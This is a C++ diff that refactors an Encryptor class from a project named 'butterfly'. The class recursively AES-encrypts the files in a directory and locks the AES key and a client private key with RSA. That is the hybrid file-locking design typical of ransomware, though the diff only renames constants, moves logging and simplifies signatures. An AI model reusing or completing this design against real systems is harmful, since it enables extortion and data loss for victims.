@@ -45,7 +45,7 @@ void Encryptor::validateAESKeyLength()
 void Encryptor::saveUnencryptedAESKeyPair(const std::string &aesKeyPair)
 {
     // 32 Bytes AESKey + 16 Bytes IV
-    if ( !butterfly::writeBinFile(butterfly::UNENC_AESKEY_FILENAME, aesKeyPair.c_str(), static_cast<long>(aesKeyPair.length())) )
+    if ( !butterfly::writeBinFile(butterfly::params::UNENC_AESKEY_FILENAME, aesKeyPair.c_str(), static_cast<long>(aesKeyPair.length())) )
     {
         #ifdef LOGGING
         LOG_ERROR("Could not save the unencrypted AESKeyPair File to Filesystem!");
@@ -58,10 +58,10 @@ void Encryptor::saveUnencryptedAESKeyPair(const std::string &aesKeyPair)
 
 void Encryptor::checkIfEncryptionFilesExists()
 {
-    if ( butterfly::existsFile(butterfly::ENC_CPRIVATERSA_FILENAME) && butterfly::existsFile(butterfly::ENC_AESKEY_FILENAME) && butterfly::existsFile(butterfly::RSA_EKIV_FILENAME) )
+    if ( butterfly::existsFile(butterfly::params::ENC_CPRIVATERSA_FILENAME) && butterfly::existsFile(butterfly::params::ENC_AESKEY_FILENAME) && butterfly::existsFile(butterfly::params::RSA_EKIV_FILENAME) )
     {
         #ifdef LOGGING
-        LOG_ERROR("Aborting encryption because encryption files (" << butterfly::ENC_CPRIVATERSA_FILENAME << ", " << butterfly::ENC_AESKEY_FILENAME << ", " << butterfly::RSA_EKIV_FILENAME <<") already exists!")
+        LOG_ERROR("Aborting encryption because encryption files (" << butterfly::params::ENC_CPRIVATERSA_FILENAME << ", " << butterfly::params::ENC_AESKEY_FILENAME << ", " << butterfly::params::RSA_EKIV_FILENAME <<") already exists!")
         #else
         std::cerr << "Aborting encryption because encryption files already exists!" << std::endl;
         #endif
@@ -88,13 +88,13 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
 
     // Get the AESKeyPair(AESKey + AESIV)
     std::string aeskeypair = _aesEncryptor->getAESKeyPair();
+    #ifdef LOGGING
+    LOG_TRACE("Length of AESKEYPair: " << aeskeypair.length() << " with AESKey: " << _aesEncryptor->getAESKey().length() << " and AESIV: " << _aesEncryptor->getAESIv().length());
+    #endif
 
     // If --protected is enabled
     if (protection)
     {
-        #ifdef LOGGING
-        LOG_TRACE("Length of AESKEYPair: " << aeskeypair.length());
-        #endif
         saveUnencryptedAESKeyPair(aeskeypair);
     }
 
@@ -106,7 +106,7 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
         {
 
             // Compare file size with the MAX FILE SIZE
-            if ( butterfly::getFileSize(file.string(), true) > butterfly::MAX_FILE_SIZE )
+            if ( butterfly::getFileSize(file.string(), true) > butterfly::params::MAX_FILE_SIZE )
             {
                 #ifdef LOGGING
                 LOG_TRACE("Spawn a new encryption thread for file: " << file.string());
@@ -124,32 +124,34 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
     // Join all threads which were spawned for huge file encryption
     joinThreads();
 
-    // Save the final AESKey.bin file
-    encryptFinalAESKeyWithRSA(aeskeypair, butterfly::ENC_AESKEY_FILENAME);
+    // Save the AESKEY Pair in the final AESKey.bin file
+    encryptFinalAESKeyWithRSA(aeskeypair);
 
 }
 
 void Encryptor::encryptCPrivateRSA()
 {
-    // Get the CPrivateRSA.pem file string
-    std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
-    EVP_PKEY *cPrivateRSAPKey = _rsaEncryptorCPrivateRSA->getEvpPkey();
 
     try
     {
+        // Get the CPrivateRSA.pem file string
+        std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
+
         // Encrypt the CPrivateRSA.pem file string
-        int encMSGLen = _rsaEncryptorCPrivateRSA->encryptEVP(cPrivateRSAPKey, cPrivateRSAStr, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);
+        int encMSGLen = _rsaEncryptorCPrivateRSA->encryptEVP(_rsaEncryptorCPrivateRSA->getEvpPkey(), cPrivateRSAStr);
         //int encMSGLen = _rsaEncryptorCPrivateRSA->encrypt(cPrivateRSAPKey, cPrivateRSAStr);
+
         // Get the encrypted CPrivateRSA.pem string
         std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedMessage();
+
         // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
-        _rsaEncryptorCPrivateRSA->writeEncMSGToFile(butterfly::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc, encMSGLen);
+        _rsaEncryptorCPrivateRSA->writeEncMSGToFile(butterfly::params::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc, encMSGLen);
 
     } catch (RSAEncryptionException &e)
     {
         std::cerr << e.what() << std::endl;
         // If error occurred here, it makes no sense to continue
-        throw EncryptorException("Error on encrypting the CPrivateRSA File! RSAEncryptionException: " + std::string(e.what()));
+        throw EncryptorException("Error occurred on encrypting the CPrivateRSA File! RSAEncryptionException: " + std::string(e.what()));
     }
 
 }
@@ -169,18 +171,20 @@ void Encryptor::encryptFileWithAES(const std::string &filepath)
 
 }
 
-void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyPair, const std::string &filename)
+void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyPair)
 {
 
     try
     {
         // Encrypt the AES Key String
-        int encMSGLen = _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyPair, butterfly::RSAKEY_TYPE::AESKEY);
+        int encMSGLen = _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyPair);
         //int encMSGLen = _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr);
+
         // Get the encrypted AES Key String
         std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();
+
         // Save the encrypted AES Key to AESKey.bin
-        _rsaEncryptorAESKey->writeEncMSGToFile(filename, aesKeyEnc, encMSGLen);
+        _rsaEncryptorAESKey->writeEncMSGToFile(butterfly::params::ENC_AESKEY_FILENAME, aesKeyEnc, encMSGLen);
 
     } catch (RSAEncryptionException &e)
     {
@@ -205,7 +209,7 @@ void Encryptor::joinThreads()
 {
     for (auto &t: _threads)
     {
-        if (t.joinable())
+        if ( t.joinable() )
             t.join();
     }
 }
